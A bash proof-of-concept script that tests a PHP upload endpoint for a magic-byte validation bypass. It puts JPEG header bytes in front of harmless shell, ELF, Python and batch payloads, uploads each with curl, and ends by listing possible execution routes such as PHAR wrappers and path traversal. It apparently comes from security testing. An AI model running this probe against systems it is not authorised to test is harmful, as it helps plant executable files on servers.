#!/bin/bash

# POC: Unrestricted File Upload - Arbitrary File Types Accepted via Magic Bytes Bypass
# This script demonstrates uploading various dangerous file types by prepending JPEG magic bytes

TARGET_URL="${1:-http://localhost:8080}"
UPLOAD_ENDPOINT="/index.php"
TEMP_DIR=$(mktemp -d)

echo "[*] Testing Unrestricted File Upload - Magic Bytes Bypass"
echo "[*] Target: $TARGET_URL$UPLOAD_ENDPOINT"
echo "[*] Working directory: $TEMP_DIR"
echo ""

# JPEG magic bytes header
JPEG_HEADER=$(printf '\xFF\xD8\xFF\xE0')

# Test 1: Shell Script Upload
echo "[+] Test 1: Uploading shell script with JPEG header prefix"
SHELL_SCRIPT="$TEMP_DIR/shell.jpg"
printf '%s' "$JPEG_HEADER" > "$SHELL_SCRIPT"
printf '#!/bin/bash\necho "Shell script executed"\nid\n' >> "$SHELL_SCRIPT"
echo "    File: $SHELL_SCRIPT"
echo "    Content: JPEG magic bytes + shell script"

RESPONSE=$(curl -s -F "userfile=@$SHELL_SCRIPT" "$TARGET_URL$UPLOAD_ENDPOINT")
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "successfully uploaded"; then
    echo "    [✓] Shell script accepted despite .jpg extension"
else
    echo "    [✗] Request may have failed"
fi
echo ""

# Test 2: ELF Executable Upload
echo "[+] Test 2: Uploading ELF executable with JPEG header prefix"
ELF_FILE="$TEMP_DIR/exec.jpg"
printf '%s' "$JPEG_HEADER" > "$ELF_FILE"
printf '\x7FELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00' >> "$ELF_FILE"
echo "    File: $ELF_FILE"
echo "    Content: JPEG magic bytes + ELF header"

RESPONSE=$(curl -s -F "userfile=@$ELF_FILE" "$TARGET_URL$UPLOAD_ENDPOINT")
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "successfully uploaded"; then
    echo "    [✓] ELF executable accepted despite .jpg extension"
else
    echo "    [✗] Request may have failed"
fi
echo ""

# Test 3: Python Script Upload
echo "[+] Test 3: Uploading Python script with JPEG header prefix"
PYTHON_FILE="$TEMP_DIR/script.jpg"
printf '%s' "$JPEG_HEADER" > "$PYTHON_FILE"
printf '#!/usr/bin/env python3\nimport os\nprint("Python code executed")\n' >> "$PYTHON_FILE"
echo "    File: $PYTHON_FILE"
echo "    Content: JPEG magic bytes + Python script"

RESPONSE=$(curl -s -F "userfile=@$PYTHON_FILE" "$TARGET_URL$UPLOAD_ENDPOINT")
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "successfully uploaded"; then
    echo "    [✓] Python script accepted despite .jpg extension"
else
    echo "    [✗] Request may have failed"
fi
echo ""

# Test 4: Windows Batch File Upload
echo "[+] Test 4: Uploading Windows batch file with JPEG header prefix"
BATCH_FILE="$TEMP_DIR/cmd.jpg"
printf '%s' "$JPEG_HEADER" > "$BATCH_FILE"
printf '@echo off\necho Batch executed\ndir\n' >> "$BATCH_FILE"
echo "    File: $BATCH_FILE"
echo "    Content: JPEG magic bytes + batch script"

RESPONSE=$(curl -s -F "userfile=@$BATCH_FILE" "$TARGET_URL$UPLOAD_ENDPOINT")
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "successfully uploaded"; then
    echo "    [✓] Batch file accepted despite .jpg extension"
else
    echo "    [✗] Request may have failed"
fi
echo ""

# Test 5: Demonstrating the vulnerability
echo "[+] Summary: Vulnerability Demonstration"
echo "    The application validates ONLY the JPEG magic bytes (FF D8 FF E0)"
echo "    Any file with this header prefix is accepted as a .jpg file"
echo "    Dangerous content types successfully uploaded:"
echo "      - Shell scripts (#!/bin/bash...)"
echo "      - Compiled executables (ELF format)"
echo "      - Python scripts (#!/usr/bin/env python3)"
echo "      - Batch files (@echo off...)"
echo ""
echo "    These files are stored with .jpg extension but contain actual executable code"
echo "    Potential execution vectors:"
echo "      - PHAR protocol wrapper in PHP"
echo "      - Path traversal to access uploaded files"
echo "      - Scripts processed by interpreters if file path is exposed"
echo "      - Combined with XXE or deserialization vulnerabilities"
echo ""

# Cleanup
rm -rf "$TEMP_DIR"
echo "[*] POC completed. Temporary files cleaned up."